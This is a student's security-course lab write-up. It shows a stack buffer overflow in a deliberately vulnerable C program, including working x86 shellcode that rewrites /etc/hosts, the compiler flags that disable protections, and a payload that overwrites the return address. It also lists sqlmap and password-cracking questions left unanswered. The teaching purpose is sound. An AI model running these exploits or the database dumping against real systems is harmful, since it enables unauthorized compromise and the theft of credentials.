# Lab #1,22110075, Ha Quoc Tien, INSE330380E_02FIE
# Task 1: Software buffer overflow

Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode in asm. This shellcode add a new entry in hosts file
```
global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80            ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20             ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80            ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80            ;syscall to close the file

    push 0x1
    pop eax
    int 0x80            ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"

```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is  added to the /etc/hosts file on your linux. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:

Description text (optional)
**Idea to attack**
- In the `vuln.c`, strcpy in vulnerable to buffer-overflow, which we can exploit to overwrite the return address and force the program to execute our shellcode.
- But, since the buffer size is now only 16 bytes, you will need to calculate the exact amount of data that will overflow the buffer and overwrite the return address.

**Step 1: Compile asm program and C program to executable code.**
- First, compile the asm program:`nasm -f elf32 -o shellcode.o shellcode.asm`<br>
    - Use `ld -o shellcode shellcode.o` to link object code to create executable file

- Second, complie the C program: `gcc -g vuln.c -o vuln.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack`<br>
    - `-fno-stack-protector`: This disables stack protection mechanisms that prevent buffer overflows.
    - `-mpreferred-stack-boundary=2`: option in GCC is used to specify the alignment of the stack.
    - `-z execstack`: This makes the stack executable, allowing us to run shellcode.

**Step 2: Extrac the shellcode**
- We need to extract the shellcode in raw byte format to inject it into the C program's buffer.

 >`objdump -d ./shellcode | grep '[0-9a-f]:' | cut -f2- | cut -d' ' -f1 | xxd -r -p > shellcode.bin`
 - This command generates a binary file shellcode.bin containing the raw shellcode.

**Step 3: Determine the Buffer Overflow Point**
- Stack frame

    ![task1_1](https://github.com/Quoctienha/InformationSecurity_Labs/blob/main/Lab1/img/task1_1.png)

- From the stack frame, we can see that the return address is located 24 bytes after the start of the buffer. Therefore, we will need to overflow the buffer with 20 bytes of junk and then overwrite the return address with the address of our shellcode (4 bytes).

**Step 4:  Craft the Exploit Payload**
- The payload consists of three parts:
    1. 20 bytes of junk
    2. The address of the shellcode (an environment variable)
    3. the shellcode, place in an environment variable

- Place the shellcode in an environment variable: `export SHELLCODE=$(cat shellcode.bin)`
- Use `GDB` to get the environment variable's address
    - `gdb vuln.out`
    - Disassemble the main function: `disas main`
    - Run the function and then search for the environment variable's address using: `print getenv("SHELLCODE")`
     
        ![task1_2](https://github.com/Quoctienha/InformationSecurity_Labs/blob/main/Lab1/img/task1_2.png)

- Next, construct the payload using a Python script:<br>
    `python -c 'print "A"*20 + "\xb8\xdf\xff\xff"' > payload`

**Step 5: Run the Exploit**
- Finally, run the vulnerable program with the crafted payload. The shellcode will be executed, and the /etc/hosts file will be modified.<br>
`./vuln.out $(cat payload)`

output screenshot (optional)

**Conclusion**: comment text about the screenshot or simply answered text for the question

# Task 2: Attack on the database of Vulnerable App from SQLi lab 
- Start docker container from SQLi. 
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:
